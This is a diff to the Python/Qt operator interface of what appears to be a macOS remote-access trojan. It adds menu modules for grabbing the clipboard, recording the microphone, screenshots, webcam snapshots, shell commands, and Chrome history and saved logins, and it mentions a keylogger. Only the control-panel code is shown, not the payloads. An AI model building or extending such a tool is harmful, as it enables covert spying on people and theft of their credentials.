@@ -63,7 +63,17 @@ class reMacQtApp(QMainWindow):
         # cmb_modules.addItems(['Hello World', 'Info', 'Clipboard', 'Chrome history', 'Chrome logins', 'Shell Command',
         #                       'Screenshot', 'Webcam', '(Keylogger - NOT WORKING!)', 'Microphone', 'Module help'])
         self.cmb_modules.addItem("Hello World", "hw")
-        self.cmb_modules.addItem("Clipboard", "cb")
+        self.cmb_modules.addItem("Module help", "mh")
+        self.cmb_modules.addItem("Copy clipboard", "cb")
+        self.cmb_modules.addItem("Record microphone", "rm")
+        self.cmb_modules.addItem("Screenshot", "sc")
+        self.cmb_modules.addItem("Shell command", "sh")
+        self.cmb_modules.addItem("Webcam snapshot", "wc")
+        self.cmb_modules.addItem("Chrome history", "ch")
+        self.cmb_modules.addItem("Chrome logins", "cl")
+        self.cmb_modules.addItem("System information", "in")
+
+
         self.cmb_modules.currentIndexChanged.connect(self.moduleCmbSel)
 
         layoutClient.addWidget(self.cmb_modules)
@@ -140,7 +150,7 @@ class reMacQtApp(QMainWindow):
         self.show()
         app.exec()
 
-    sentCmdListCursor = 0
+    sentCmdListCursor = -1
 
     def moduleCmbSel(self):
         print(f"Module selected: {self.cmb_modules.currentData()}")
@@ -158,9 +168,9 @@ class reMacQtApp(QMainWindow):
             self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])
 
     def keyUpPressed(self):
-        if (self.sentCmdListCursor - 1) * -1 <= len(self.sentCommands):
-            self.sentCmdListCursor -= 1
+        if (self.sentCmdListCursor) * -1 <= len(self.sentCommands):
             self.txtCmdToSend.setText(self.sentCommands[self.sentCmdListCursor])
+            self.sentCmdListCursor -= 1
 
     def serverStarted(self, ok):
         conHost = "192.168.0.49"
@@ -238,7 +248,7 @@ class reMacQtApp(QMainWindow):
             return
         self.sentCommands.append(cmd2Send)
         self.txtCmdToSend.setText("")
-        self.recalledCommand = 0
+        self.recalledCommand = -1
 
         shost = txtHost.text()
         sport = txtPort.text()
